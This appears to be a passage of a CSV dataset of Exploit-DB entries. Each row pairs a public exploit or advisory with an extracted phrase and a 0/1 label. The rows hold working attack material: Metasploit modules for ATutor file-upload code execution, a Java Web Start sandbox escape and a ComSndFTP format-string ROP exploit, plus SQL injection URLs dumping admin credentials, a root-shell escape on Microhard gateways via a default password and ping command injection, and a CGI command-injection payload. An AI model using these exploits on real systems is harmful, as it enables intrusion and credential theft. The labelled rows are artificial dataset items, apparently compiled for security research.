make_nops(28)  		print_status(""Trying target #{target.name}..."")  		send_request_raw({ 			'uri'          => payload.encoded, 			'version'      => '1.1', 			'method'       => 'GET', 			'headers'      => 			{ 				'Authorization' => ""Basic #{Rex::Text.encode_base64(filler)}"" 			} 		}, 5)  		handler 	end end",a specially crafted http request,1
46691,"ATutor < 2.2.4 - 'file_manager' Remote Code Execution (Metasploit) ## # This module requires Metasploit: http://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  class MetasploitModule < Msf::Exploit::Remote   Rank = ExcellentRanking    include Msf::Exploit::Remote::HttpClient   include Msf::Exploit::FileDropper    def initialize(info={})     super(update_info(info,       'Name'           => ""ATutor < 2.2.4 'file_manager' Remote Code Execution"",       'Description'    => %q{          This module allows the user to run commands on the server with teacher user privilege.          The 'Upload files' section in the 'File Manager' field contains arbitrary file upload vulnerability.          The ""$IllegalExtensions"" function has control weakness and shortcomings.          It is possible to see illegal extensions within ""constants.inc.php"". (exe|asp|php|php3|php5|cgi|bat...)          However, there is no case-sensitive control. Therefore, it is possible to bypass control with filenames such as "".phP"", "".Php""          It can also be used in dangerous extensions such as ""shtml"" and ""phtml"".           The directory path for the ""content"" folder is located at ""config.inc.php"".          For the exploit to work, the ""define ('AT_CONTENT_DIR', 'address')"" content folder must be located in the web home directory or the address must be known.           This exploit creates a course with the teacher user and loads the malicious php file into server.       },       'License'        => MSF_LICENSE,       'Author'         =>         [           'AkkuS <Özkan Mustafa Akkuş>', # Discovery & PoC & MSF Module         ],       'References'     =>         [           [ 'CVE', ''  ],           [ 'URL', 'http://pentest.com.tr/exploits/ATutor-2-2-4-file-manager-Remote-Code-Execution-Injection-Metasploit.html' ],           [ 'URL', 'https://atutor.github.io/' ],           [ 'URL', 'http://www.atutor.ca/' ]         ],       'Privileged'     => false,       'Payload'        =>         {           'DisableNops' => true,         },       'Platform'       => ['php'],       'Arch'           => ARCH_PHP,       'Targets'        => [[ 'Automatic', { }]],       'DisclosureDate' => '09 April 2019',       'DefaultTarget'  => 0))      register_options(       [         OptString.new('TARGETURI', [true, 'The path of Atutor', '/ATutor/']),         OptString.new('USERNAME', [true, 'The Teacher Username to authenticate as']),         OptString.new('PASSWORD', [true, 'The Teacher password to authenticate with']),         OptString.new('CONTENT_DIR', [true, 'The content folder location', 'content'])       ],self.class)   end    def exec_payload      send_request_cgi({       'method'   => 'GET',       'uri'      => normalize_uri(target_uri.path, ""#{datastore['CONTENT_DIR']}"", @course_id, ""#{@fn}"")     })   end    def peer     ""#{ssl ? 'https://' : 'http://' }#{rhost}:#{rport}""   end    def print_status(msg='')     super(""#{peer} - #{msg}"")   end    def print_error(msg='')     super(""#{peer} - #{msg}"")   end    def print_good(msg='')     super(""#{peer} - #{msg}"")   end ## # Version and Vulnerability Check ##   def check      res = send_request_cgi({       'method'   => 'GET',       'uri'      => normalize_uri(target_uri.path, ""#{datastore['CONTENT_DIR']}/"")     })      unless res       vprint_error 'Connection failed'       return CheckCode::Unknown     end      if res.code == 404        return Exploit::CheckCode::Safe     end     return Exploit::CheckCode::Appears   end ## # csrftoken read and create a new course ##   def create_course(cookie, check)      res = send_request_cgi({       'method'   => 'GET',       'uri' => normalize_uri(target_uri.path, ""mods"", ""_core"", ""courses"", ""users"", ""create_course.php""),       'headers' =>       {         'Referer' => ""#{peer}#{datastore['TARGETURI']}users/index.php"",         'cookie'   => cookie,       },       'agent' => 'Mozilla'     })      if res && res.code == 200 && res.body =~ /Create Course: My Start Pag/       @token = res.body.split('csrftoken""  value=""')[1].split('""')[0]     else       return false     end       @course_name = Rex::Text.rand_text_alpha_lower(5)     post_data = Rex::MIME::Message.new     post_data.add_part(@token, nil, nil,'form-data; name=""csrftoken""')     post_data.add_part('true', nil, nil, 'form-data; name=""form_course""')     post_data.add_part(@course_name, nil, nil, 'form-data; name=""title""')     post_data.add_part('top', nil, nil, 'form-data; name=""content_packaging""')     post_data.add_part('protected', nil, nil, 'form-data; name=""access""')     post_data.add_part('Save', nil, nil, 'form-data; name=""submit""')     data = post_data.to_s      res = send_request_cgi({       'method' => 'POST',           'data'  => data,       'agent' => 'Mozilla',       'ctype' => ""multipart/form-data; boundary=#{post_data.bound}"",       'cookie' => cookie,       'uri' => normalize_uri(target_uri.path, ""mods"", ""_core"", ""courses"", ""users"", ""create_course.php"")          })      location = res.redirection.to_s     if res && res.code == 302 && location.include?('bounce.php?course')       @course_id = location.split('course=')[1].split(""&p"")[0]       return true     else       return false     end   end ## # Upload malicious file // payload integration ##   def upload_shell(cookie, check)      res = send_request_cgi({       'method'   => 'GET',       'uri' => normalize_uri(target_uri.path, ""bounce.php?course="" + @course_id),       'headers' =>       {         'Referer' => ""#{peer}#{datastore['TARGETURI']}users/index.php"",         'cookie'   => cookie,       },       'agent' => 'Mozilla'     })      ucookie = ""ATutorID=#{$2};"" if res.get_cookies =~ /ATutorID=(.*); ATutorID=(.*);/      file_name = Rex::Text.rand_text_alpha_lower(8) + "".phP""     @fn = ""#{file_name}""     post_data = Rex::MIME::Message.new     post_data.add_part('10485760', nil, nil, 'form-data; name=""MAX_FILE_SIZE""')     post_data.add_part(payload.encoded, 'application/octet-stream', nil, ""form-data; name=\""uploadedfile\""; filename=\""#{file_name}\"""")     post_data.add_part('Upload', nil, nil, 'form-data; name=""submit""')     post_data.add_part('', nil, nil, 'form-data; name=""pathext""')      data = post_data.to_s      res = send_request_cgi({       'method' => 'POST',           'data'  => data,       'agent' => 'Mozilla',       'ctype' => ""multipart/form-data; boundary=#{post_data.bound}"",       'cookie' => ucookie,       'uri' => normalize_uri(target_uri.path, ""mods"", ""_core"", ""file_manager"", ""upload.php"")          })      if res && res.code == 302 && res.redirection.to_s.include?('index.php?pathext')       print_status(""Trying to upload #{file_name}"")       return true     else       print_status(""Error occurred during uploading!"")       return false     end   end ## # Password encryption with csrftoken ##   def get_hashed_password(token, password, check)     if check       return Rex::Text.sha1(password + token)     else       return Rex::Text.sha1(Rex::Text.sha1(password) + token)     end   end ## # User login operations ##   def login(username, password, check)     res = send_request_cgi({       'method'   => 'GET',       'uri'      => normalize_uri(target_uri.path, ""login.php""),       'agent' => 'Mozilla',     })      token = $1 if res.body =~ /\) \+ \""(.*)\""\);/     cookie = ""ATutorID=#{$1};"" if res.get_cookies =~ /; ATutorID=(.*); ATutorID=/     if check       password = get_hashed_password(token, password, true)     else       password = get_hashed_password(token, password, false)     end      res = send_request_cgi({       'method'   => 'POST',       'uri'      => normalize_uri(target_uri.path, ""login.php""),       'vars_post' => {         'form_password_hidden' => password,         'form_login' => username,         'submit' => 'Login'       },       'cookie' => cookie,       'agent' => 'Mozilla'     })     cookie = ""ATutorID=#{$2};"" if res.get_cookies =~ /(.*); ATutorID=(.*);/      if res && res.code == 302        if res.redirection.to_s.include?('bounce.php?course=0')         res = send_request_cgi({           'method'   => 'GET',           'uri'      => normalize_uri(target_uri.path, res.redirection),           'cookie' => cookie,           'agent' => 'Mozilla'         })         cookie = ""ATutorID=#{$1};"" if res.get_cookies =~ /ATutorID=(.*);/         if res && res.code == 302 && res.redirection.to_s.include?('users/index.php')            res = send_request_cgi({              'method'   => 'GET',              'uri'      => normalize_uri(target_uri.path, res.redirection),              'cookie' => cookie,              'agent' => 'Mozilla'            })            cookie = ""ATutorID=#{$1};"" if res.get_cookies =~ /ATutorID=(.*);/            return cookie           end        else res.redirection.to_s.include?('admin/index.php')           fail_with(Failure::NoAccess, 'The account is the administrator. Please use a teacher account!')           return cookie        end     end      fail_with(Failure::NoAccess, ""Authentication failed with username #{username}"")     return nil   end ## # Exploit controls and information ##   def exploit     tcookie = login(datastore['USERNAME'], datastore['PASSWORD'], false)     print_good(""Logged in as #{datastore['USERNAME']}"")      if create_course(tcookie, true)       print_status(""CSRF Token : "" + @token)       print_status(""Course Name : "" + @course_name + "" Course ID : "" + @course_id)       print_good(""New course successfully created."")     end      if upload_shell(tcookie, true)       print_good(""Upload successfully."")       print_status(""Trying to exec payload..."")       exec_payload     end   end end ## # The end of the adventure (o_O) // AkkuS ##",malformed vulnerable parameter,1
5591,"AJ Auction 6.2.1 - 'classifide_ad.php' SQL Injection --==+================================================================================+==-- --==+   AJ Auction <= 6.2.1 (classifide_ad.php) Remote SQL Injection Vulnerability   +==-- --==+================================================================================+==--    Discovered By: t0pP8uZz Discovered On: 12 MAY 2008 Script Download: http://www.ajsquare.com/products/auction/index.php?auc=1 DORK: inurl:""classifide_ad.php""    Vendor Has Not Been Notified!    DESCRIPTION:   AJ Auction (all versions to date) suffers from a insecure mysql query, allowing a remote attacker, to arbitrary inject mysql code/query.  the below injection will display the admin credentials.    SQL Injection's:  http://site.com/classifide_ad.php?item_id=-1/**/UNION/**/ALL/**/SELECT/**/1,2,3,4,CONCAT(user_name,char(58),password),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54/**/FROM/**/admin/**/LIMIT/**/0,1/*    NOTE/TIP:   admin login is at /admin/    GREETZ: milw0rm.com, h4ck-y0u.org, CipherCrew !   peace, t0pP8uZz   --==+================================================================================+==-- --==+   AJ Auction <= 6.2.1 (classifide_ad.php) Remote SQL Injection Vulnerability   +==-- --==+================================================================================+==--  # milw0rm.com [2008-05-12]",a insecure mysql query,1
45041,"Microhard Systems 3G/4G Cellular Ethernet and Serial Gateway - Restricted Shell Escape Microhard Systems 3G/4G Cellular Ethernet and Serial Gateway Backdoor Jailbreak   Vendor: Microhard Systems Inc. Product web page: http://www.microhardcorp.com Affected version: IPn4G 1.1.0 build 1098                   IPn3Gb 2.2.0 build 2160                   IPn4Gb 1.1.6 build 1184-14                   IPn4Gb 1.1.0 Rev 2 build 1090-2                   IPn4Gb 1.1.0 Rev 2 build 1086                   Bullet-3G 1.2.0 Rev A build 1032                   VIP4Gb 1.1.6 build 1204                   VIP4G 1.1.6 Rev 3.0 build 1184-14                   VIP4G-WiFi-N 1.1.6 Rev 2.0.0 build 1196                   IPn3Gii / Bullet-3G 1.2.0 build 1076                   IPn4Gii / Bullet-LTE 1.2.0 build 1078                   BulletPlus 1.3.0 build 1036                   Dragon-LTE 1.1.0 build 1036  Summary: The new IPn4Gb provides a rugged, industrial strength wireless solution using the new and ultra fast 4G LTE cellular network infrastructure. The IPn4Gb features integrated Firewall, IPSec / VPN & GRE Tunneling, IP/MAC Access Control Lists. The IPn4Gb can transport critical data to and from SMS, Ethernet and Serial RS232/485/422 devices!  The IPn3Gb provides a fast, secure industrial strength wireless solution that uses the widespread deployment of cellular network infrastructure for critical data collection. From remote meters and sensors, to providing mobile network access, the IPn3Gb delivers! The IPn3Gb is a powerful HSPA+ and Quad Band GSM device compatible almost anywhere. It provides robust and secure wireless communication of Serial, USB and Ethernet data.  The all new Bullet-3G provides a compact, robust, feature packed industrial strength wireless solution using fast 3G/HSPA+ network infrastructure. The Bullet-3G takes things to the next level by providing features such as Ethernet with PoE, RS232 Serial port and 2x Programmable I/O. Offering enhanced, 'Secure Communication' with its integrated Firewall, IPSec VPN Tunneling, IP/MAC Access Control Lists, the Bullet-3G is a solution worth looking at!  The all new Dragon-LTE provides a feature packed, compact OEM, industrial strength wireless IoT & M2M solution. Connect any device, wired or wireless, and provide remote cellular access using the Dragon-LTE. The Dragon-LTE features a OEM design for tight system integration and design flexibility with dual Ethernet Ports and high power 802.11b/g/n WIFI. With its integrated Firewall, IPSec VPN Tunneling and IP/MAC Access Control Lists, the Dragon-LTE provides a solution for any cellular application!  The new VIP4Gb provides a rugged, industrial strength wireless solution using 4G LTE network infrastructure for critical data communications. The VIP4Gb provides simultaneous network connections for 802.11a/b/g/n WiFi devices, 4 x 10/100/1000 Ethernet ports, Digital I/O, and a RS232/RS485 port, resulting in a communication device that can be deployed in any application! The VIP4Gb is a powerful 4G LTE device compatible on any cellular network. It provides robust and secure wireless communication of Serial, Ethernet & WiFi data.  Desc: The web shell application includes a service called Microhard Sh that is documented only as 'reserved for internal use'. This service can be enabled by an authenticated user within the Services menu in the web admin panel. This can also be enabled via CSRF attack. When the service is enabled, a user 'msshc' is created on the system with password 'msshc' for SSH shell access on port 22. When connected, the user is dropped into a NcFTP jailed environment, that has limited commands for file transfer administration. One of the commands is a custom added 'ping' command that has a command injection vulnerability that allows the attacker to escape the restricted environment and enter into a root shell terminal that can execute commands as the root user.   Tested on: httpd-ssl-1.0.0            Linux 2.6.32.9 (Bin@DProBuilder) (gcc version 4.4.3)   Vulnerability discovered by Gjoko 'LiquidWorm' Krstic                             @zeroscience   Advisory ID: ZSL-2018-5486 Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2018-5486.php   13.03.2018  --   1) Enable Microhard Sh service: -------------------------------  http://192.168.1.1/cgi-bin/webif/system-services.sh?service=msshc&action=start - Start the Microhard Sh (msshc) service http://192.168.1.1/cgi-bin/webif/system-services.sh?service=msshc&action=enable - Auto-enable (auto-start)   2) Check what happens when enabling Microhard Sh service: ---------------------------------------------------------  # cat /etc/init.d/msshc #!/bin/sh /etc/rc.common # Copyright (C) 2013 Microhardcorp  start() {   deluser msshc   rm -rf /tmp/msshc   mkdir -p /tmp/msshc   msshcshell=$(cat /etc/shells | grep -c ""/etc/msshc.sh"")   [ $msshcshell -gt 0 ] || echo ""/etc/msshc.sh"" >> /etc/shells   passwd=$(/sbin/uci get msshc.general.passwd)   echo ""$passwd"" >> /etc/passwd }  stop() {   deluser msshc   rm -rf /tmp/msshc }   3) Check the /etc/msshc.sh script: ----------------------------------  # cat /etc/msshc.sh #!/bin/sh  # Copyright (C) 2013 Microhardcorp  /usr/bin/ncftp  exit 0   4) Check the /sbin/uci binary: ------------------------------  Usage: /sbin/uci [<options>] <command> [<arguments>]  Commands:     batch     export     [<config>]     import     [<config>]     changes    [<config>]     commit     [<config>]     add        <config> <section-type>     add_list   <config>.<section>.<option>=<string>     show       [<config>[.<section>[.<option>]]]     get        <config>.<section>[.<option>]     set        <config>.<section>[.<option>]=<value>     delete     <config>[.<section[.<option>]]     rename     <config>.<section>[.<option>]=<name>     revert     <config>[.<section>[.<option>]]  Options:     -c <path>  set the search path for config files (default: /etc/config)     -d <str>   set the delimiter for list values in uci show     -f <file>  use <file> as input instead of stdin     -L         do not load any plugins     -m         when importing, merge data into an existing package     -n         name unnamed sections on export (default)     -N         don't name unnamed sections     -p <path>  add a search path for config change files     -P <path>  add a search path for config change files and use as default     -q         quiet mode (don't print error messages)     -s         force strict mode (stop on parser errors, default)     -S         disable strict mode     -X         do not use extended syntax on 'show'  # /sbin/uci get msshc.general.passwd msshc:$1$bM7uisGu$iMRC.LVlXjKAv7Y07t1fm/:0:0:root:/tmp/msshc:/etc/msshc.sh   5) Check the NcFTP binary: --------------------------  # /usr/bin/ncftp -h  Usage:  ncftp [flags] [<host> | <directory URL to browse>]  Flags:   -u XX  Use username XX instead of anonymous.   -p XX  Use password XX with the username.   -P XX  Use port number XX instead of the default FTP service port (21).   -j XX  Use account XX with the username (rarely needed).   -F     Dump a sample $HOME/.ncftp/firewall prefs file to stdout and exit.  Program version:  NcFTP 3.2.5/474 Feb 02 2011, 05:13 PM Library version:  LibNcFTP 3.2.5 (January 17, 2011) Build system:     Linux DProBuilder 2.6.34.9-69.fc13.i686.PAE #1 SMP Tue Ma...  This is a freeware program by Mike Gleason (http://www.NcFTP.com). A directory URL ends in a slash, i.e. ftp://ftp.freebsd.org/pub/FreeBSD/ Use ncftpget and ncftpput for command-line FTP and file URLs.   6) Go to jail: --------------  lqwrm@metalgear:~$ ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 msshc@192.168.1.1 The authenticity of host '192.168.1.1 (192.168.1.1)' can't be established. RSA key fingerprint is SHA256:x9GG/Dlkg88058ilA2xyhYqllYRgZOTPu6reGS8K1Yg. Are you sure you want to continue connecting (yes/no)? yes Warning: Permanently added '192.168.1.1' (RSA) to the list of known hosts. msshc@192.168.1.1's password:  NcFTP 3.2.5 (Feb 02, 2011) by Mike Gleason (http://www.NcFTP.com/contact/).  Copyright (c) 1992-2011 by Mike Gleason. All rights reserved.  ncftp> ? Commands may be abbreviated.  'help showall' shows hidden and unsupported  commands.  'help <command>' gives a brief description of <command>.  ascii    close    help     mkdir    put      rename   set      umask   binary   debug    lls      open     pwd      rhelp    show      cd       dir      lrm      passive  quit     rm       site      chmod    get      ls       ping     quote    rmdir    type       For details, please see the manual (""man ncftp"" at your regular shell prompt or online at http://www.NcFTP.com/ncftp/doc/ncftp.html). ncftp> help showall Commands may be abbreviated.  'help showall' shows hidden and unsupported commands.  'help <command>' gives a brief description of <command>.  ?        chmod    exit     ls       mv       pwd      rhelp    site ascii    close    get      mget     open     quit     rm       type binary   debug    help     mkdir    passive  quote    rmdir    umask bye      delete   lls      mls      ping     rename   set cd       dir      lrm      mput     put      rglob    show  For details, please see the manual (""man ncftp"" at your regular shell prompt or online at http://www.NcFTP.com/ncftp/doc/ncftp.html). ncftp> ls ls: must be connected to do that. ncftp> man ncftp man: no such command. ncftp> pwd pwd: must be connected to do that. ncftp> show anon-password                  NcFTP@ auto-ascii                     |.txt|.asc|.html|.htm|.css|.xml|.ini|.pl|.hqx|.cfg|.c|.h|.cpp|.hpp|.bat|.m3u|.pls| auto-resume                    no autosave-bookmark-changes      no confirm-close                  no connect-timeout                20 control-timeout                135 logsize                        10240 pager                          more passive                        optional progress-meter                 2 (statbar) redial-delay                   20 save-passwords                 ask show-status-in-xterm-titlebar  no so-bufsize                     0 (use system default) xfer-timeout                   3600 yes-i-know-about-NcFTPd        no ncftp>   7) The Shawshank Redemption: ----------------------------   ncftp> ping -c1 -4 0.0.0.0 `id`  BusyBox v1.15.3 (2016-06-20 14:58:14 MDT) multi-call binary  Usage: ping [OPTIONS] HOST  Send ICMP ECHO_REQUEST packets to network hosts  Options:     -4, -6        Force IPv4 or IPv6 hostname resolution     -c CNT        Send only CNT pings     -s SIZE        Send SIZE data bytes in packets (default:56)     -I IFACE/IP    Use interface or IP address as source     -W SEC        Seconds to wait for the first response (default:10)             (after all -c CNT packets are sent)     -w SEC        Seconds until ping exits (default:infinite)             (can exit earlier with -c CNT)     -q        Quiet, only displays output at start             and when finished  ncftp>   8) Come on Andy: ----------------  ncftp> ping -c1 -4 0.0.0.0 && /bin/sh PING 0.0.0.0 (0.0.0.0): 56 data bytes 64 bytes from 127.0.0.1: seq=0 ttl=64 time=0.423 ms  --- 0.0.0.0 ping statistics --- 1 packets transmitted, 1 packets received, 0% packet loss round-trip min/avg/max = 0.423/0.423/0.423 ms   BusyBox v1.15.3 (2016-06-20 14:58:14 MDT) built-in shell (ash) Enter 'help' for a list of built-in commands.  /tmp/msshc # id ; uname -r uid=0(root) gid=0(root) 2.6.32.9 /tmp/msshc #",the widespread deployment of cellular network infrastructure for critical data collection.,1
23064,"Attila PHP 3.0 - SQL Injection Unauthorized Privileged Access source: https://www.securityfocus.com/bid/8502/info  An SQL injection vulnerability has been reported in Attila PHP that could allow an attacker to gain unauthorized privileged access to a target site. This could be accomplished by requesting a URI including parameters designed to influence the results of specific user verification checks. Privileged access to a site implementing Attila PHP could allow an attacker to gain sensitive information or launch other attacks.   Set the URI parameter ""cook_id"" to the value ""0 OR visiteur=1"" in a request to http://www.example.org/index.php3",requesting a URI including parameters designed to influence the results of specific user verification checks,1
19557,"John S.2 Roberts AnyForm 1.0/2.0 - CGI Semicolon source: https://www.securityfocus.com/bid/719/info  AnyForm is a popular form CGI designed to support simple forms that deliver responses via email. Certain versions of AnyForm did not perform user supplied data sanity checking and could be exploited by remote intruders to execute arbitrary commands. These commands were issued as the UID which the web server runs as, typically 'nobody'.   Exploit as taken from the original post on this issue:  To exploit, create a form with a hidden field something like this:  <input type=""hidden"" name=""AnyFormTo"" value=""foo@bar.com;command-to-execute with whatever arguments;/usr/lib/sendmail -t foo@bar.com "">  Then submit the form to the ""AnyForm"" CGI on the server to be attacked. The value of this parameter is passed to this code:  SystemCommand=""/usr/lib/sendmail -t "" + AnyFormTo + "" <"" + CombinedFileName; system(SystemCommand);  Since system invokes a shell, the semicolons are treated as command delimeters and anything can be inserted",simple forms that deliver responses via email,1
16495,"Sun Java Web Start BasicServiceImpl - Remote Code Execution (Metasploit) ## # $Id: java_basicservice_impl.rb 11623 2011-01-22 00:16:57Z egypt $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core' require 'rex'  class Metasploit3 < Msf::Exploit::Remote 	Rank = ExcellentRanking  	include Msf::Exploit::Remote::HttpServer 	# Internet explorer freaks out and shows the scary yellow info bar if this 	# is in an iframe.  The exploit itself also creates a couple of scary popup 	# windows about ""downloading application"" that I haven't been able to 	# figure out how to prevent.  For both of these reasons, don't include it 	# in Browser Autopwn. 	#include Msf::Exploit::Remote::BrowserAutopwn 	#autopwn_info({ :javascript => false })  	def initialize( info = {} )  		super( update_info( info, 			'Name'          => 'Sun Java Web Start BasicServiceImpl Remote Code Execution Exploit', 			'Description'   => %q{ 			This module exploits a vulnerability in Java Runtime Environment 			that allows an attacker to escape the Java Sandbox. By injecting 			a parameter into a javaws call within the BasicServiceImpl class 			the default java sandbox policy file can be therefore overwritten. 			The vulnerability affects version 6 prior to update 22.  			NOTE: Exploiting this vulnerability causes several sinister-looking 			popup windows saying that Java is ""Downloading application."" 			}, 			'License'       => MSF_LICENSE, 			'Author'        => [ 				'Matthias Kaiser', # Discovery, PoC, metasploit module 				'egypt' # metasploit module 			], 			'Version'       => '$Revision: 11623 $', 			'References'    => 			[ 				[ 'CVE', '2010-3563' ], 				[ 'OSVDB', '69043' ], 				[ 'URL', 'http://mk41ser.blogspot.com' ], 			], 			'Platform'      => [ 'java', 'win' ], 			'Payload'       => { 'Space' => 20480, 'BadChars' => '', 'DisableNops' => true }, 			'Targets'       => 				[ 					[ 'Windows x86', 						{ 							'Arch' => ARCH_X86, 							'Platform' => 'win', 						} 					], 					[ 'Generic (Java Payload)', 						{ 							'Arch' => ARCH_JAVA, 							'Platform' => 'java', 						} 					], 				], 			'DefaultTarget'  => 0, 			'DisclosureDate' => 'Oct 12 2010' 			)) 	end  	def on_request_uri( cli, request ) 		jpath = get_uri(cli)  		case request.uri 		when /java.security.policy/ 			print_status(""Checking with HEAD"") 			ack = ""OK"" 			send_response(cli, ack, { 'Content-Type' => 'application/x-java-jnlp-file' })  		when /all.policy/ 			all = ""grant {permission java.security.AllPermission;};\n"" 			print_status(""Sending all.policy"") 			send_response(cli, all, { 'Content-Type' => 'application/octet-stream' })  		when /init.jnlp/ 			init = <<-EOS <?xml version=""1.0"" encoding=""UTF-8""?> <jnlp href=""#{jpath}/init.jnlp"" version=""1""> #{jnlp_info} 	<application-desc main-class=""BasicServiceExploit""> 		<argument>#{jpath}</argument> 	</application-desc> </jnlp> EOS 			print_status(""Sending init.jnlp"") 			send_response(cli, init, { 'Content-Type' => 'application/x-java-jnlp-file' })  		when /exploit.jnlp/ 			expl = <<-EOS <?xml version=""1.0"" encoding=""UTF-8""?> 	<jnlp href=""#{jpath}/exploit.jnlp"" version=""1""> #{jnlp_info} 	<application-desc main-class=""Exploit""/> 	</jnlp> EOS 			print_status(""Sending exploit.jnlp"") 			send_response(cli, expl, { 'Content-Type' => 'application/x-java-jnlp-file' })  		when /\.jar$/i 			p = regenerate_payload(cli) 			paths = [ 				[ ""BasicServiceExploit.class"" ], 				[ ""Exploit.class"" ], 			] 			dir = [ Msf::Config.data_directory, ""exploits"", ""cve-2010-3563"" ] 			jar = p.encoded_jar 			jar.add_files(paths, dir) 			print_status(""Sending Jar file to #{cli.peerhost}:#{cli.peerport}..."") 			send_response(cli, jar.pack, { 'Content-Type' => ""application/octet-stream"" }) 			handler(cli)  		else 			print_status(""Sending redirect to init.jnlp"") 			send_redirect(cli, get_resource() + '/init.jnlp', '')  		end 	end  	def jnlp_info 		buf = <<-EOS 		<information> 			<title>#{Rex::Text.rand_text_alpha(rand(10)+10)}</title> 			<vendor>#{Rex::Text.rand_text_alpha(rand(10)+10)}</vendor> 			<description>#{Rex::Text.rand_text_alpha(rand(10)+10)}</description> 		</information> 		<resources> 			<java version=""1.6+""/> 			<jar href=""#{get_uri}/exploit.jar""/> 		</resources> EOS 	end end",injecting a parameter into a javaws call within the BasicServiceImpl class,1
23905,ADA IMGSVR 0.4 - Remote Directory Listing source: https://www.securityfocus.com/bid/10026/info  A vulnerability has been reported in the ImgSvr server software that may allow a remote user to the disclose root directory listings. This issue has also been reported to allow for listing of directories that reside outside the server root as well.  An attacker may leverage this issue to gain access to sensitive information by disclosing directory listings; information disclosed in this way could lead to further attacks against the target system.   For listing directories inside the server root (provided by Donato Ferrante): http://www.example.org:1234/%00/ http://www.example.org:1234/someDirectory%00/ http://www.example.org:1234/someDirectory/%00/  For listing directories outside of the server root (provided by Dr_insane): http://www.example.com:1234/%2f%2e%2e%2f%2f%2e%2e%2f/,disclosing directory listings,1
41050,"Inout Webmail Ultimate Edition 4.0 Script - Improper Access Restrictions # # # # #  # Vulnerability: Security Bypass # Date: 13.01.2017 # Vendor Homepage: http://www.inoutscripts.com/ # Script Name: Inout Webmail Ultimate Edition v4.0 # Script Version: Ultimate Edition v4.0, Ultimate Hypertable Version # Script Buy Now: http://www.inoutscripts.com/demo/inout-webmail/demo/ # Author: İhsan Şencan # Author Web: http://ihsan.net # Mail : ihsan[beygir]ihsan[nokta]net # # # # #  # Direct entrance.. # An attacker can exploit this issue via a browser. # The following example URIs are available: # http://localhost/[PATH]/admin/index.php?page=ads/sponsoredlinks # http://localhost/[PATH]/admin/index.php?page=todolist/todolist # http://localhost/[PATH]/admin/index.php?page=statistics/registration_showgraph # http://localhost/[PATH]/admin/index.php?page=statistics/showgraph # http://localhost/[PATH]/admin/index.php?page=statistics/accountactivity # http://localhost/[PATH]/admin/index.php?page=calendar/calendar # Vs....... # # # # #",a browser,0
22339,SimpleBBS 1.0.6 - 'users.php' Insecure File Permissions source: https://www.securityfocus.com/bid/7045/info  SimpleBBS reportedly creates sensitive files with world-readable permissions.  As a result anyone who has access to SimpleBBS web resources may access confidential information stored in the SimpleBBS user database.  This vulnerability was reported for SimpleBBS 1.0.6. It is not known if earlier versions are affected by this vulnerability.  http://www.example.com/simplebbs/users/users.php,creates sensitive files with world-readable permissions,1
19177,"ComSndFTP 1.3.7 Beta - USER Format String (Write4) (Metasploit) ## # $Id$ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # web site for more information on licensing and terms of use. #   http://metasploit.com/ ##  require 'msf/core'   class Metasploit3 < Msf::Exploit::Remote 	Rank = GoodRanking  	include Msf::Exploit::Remote::Tcp  	def initialize(info = {}) 		super(update_info(info, 			'Name'          => 'ComSndFTP v1.3.7 Beta USER Buffer Overflow', 			'Description'   => %q{ 					This module exploits the ComSndFTP FTP Server version 1.3.7 beta by sending a specially 				crafted format string specifier as a username. The crafted username is sent to to the server to 				overwrite the hardcoded function pointer from Ws2_32.dll!WSACleanup. Once this function pointer 				is triggered, the code bypasses dep and then repairs the pointer to execute arbitrary code. 				The SEH exit function is preferred so that the administrators are not left with an unhandled 				exception message. When using the meterpreter payload, the process will never die, allowing 				for continuous exploitation. 			}, 			'Author'        => 				[ 					'ChaoYi Huang <ChaoYi.Huang[at]connect.polyu.hk>', # vuln discovery + poc 					'rick2600 <rick2600[at]corelan.be>',               # msf module (target XP) 					'mr_me <mr_me[at]@corelan.be>',                    # msf module (target 23k) 					'corelanc0d3r <peter.ve[at]corelan.be>'            # msf module 				], 			'Arch'          => [ ARCH_X86 ], 			'License'       => MSF_LICENSE, 			'Version'       => '$Revision$', 			'References'    => 				[ 					# When a DoS is NOT a DoS 					[ 'EDB', '19024'] 				], 			'DefaultOptions' => 				{ 					'EXITFUNC' => 'seh' 				}, 			'Platform'      => ['win'], 			'Privileged'    => false, 			'Payload'       => 				{ 					'Space'            => 1000, 					'BadChars'         => ""\x00\x0a\x0d"", 					'StackAdjustment'  => -3500, 					'DisableNops'      => 'True' 				}, 			'Targets'       => 				[ 					[ 						'Windows XP SP3 - English', 						{ 							'Functionpointer'   => 0x71AC4050,  # winsock pointer 							'Functionaddress'   => 0x71AB2636,  # the repair address 							'Pivot'             => 0x00408D16,  # 0x004093AE-0x698 add esp, 72c ; retn 							'Pad' => 568 						} 					], 					[ 						'Windows Server 2003 - English', 						{ 							'Functionpointer'   => 0x71C14044,  # winsock pointer 							'Functionaddress'   => 0x71C02661,  # the repair address 							'Pivot'             => 0x00408D16,  # 0x004093AE-0x698 add esp, 72c ; retn 							'Pad' => 568 						} 					] 				], 			'DisclosureDate' => 'Jun 08 2012'))  		register_options( 			[ 				Opt::RPORT(21), 			], self.class) 	end  	def check 		connect 		banner    = sock.get(-1,3) 		validate  = ""\x32\x32\x30\x20\xbb\xb6\xd3\xad\xb9"" 		validate << ""\xe2\xc1\xd9\x46\x54\x50\xb7\xfe\xce"" 		validate << ""\xf1\xc6\xf7\x21\x0d\x0a"" 		disconnect  		if (banner == validate) 			return Exploit::CheckCode::Vulnerable 		end 		return Exploit::CheckCode::Safe 	end  	def junk(n=4) 		return rand_text_alpha(n).unpack(""V"").first 	end  	def exploit  		rop = '' 		if target.name =~ /Server 2003/ 			# C:\WINDOWS\system32\msvcrt.dll v7.0.3790.3959 			rop = [ 				0x77be3adb, # pop eax ; retn 				0x77ba1114, # <- *&VirtualProtect() 				0x77bbf244, # mov eax,[eax] ; pop ebp ; retn 				junk, 				0x77bb0c86, # xchg eax,esi ; retn 				0x77be3adb, # pop eax ; retn 				0xFFFFFBFF, # dwSize 				0x77BAD64D, # neg eax ; pop ebp ; retn 				junk, 				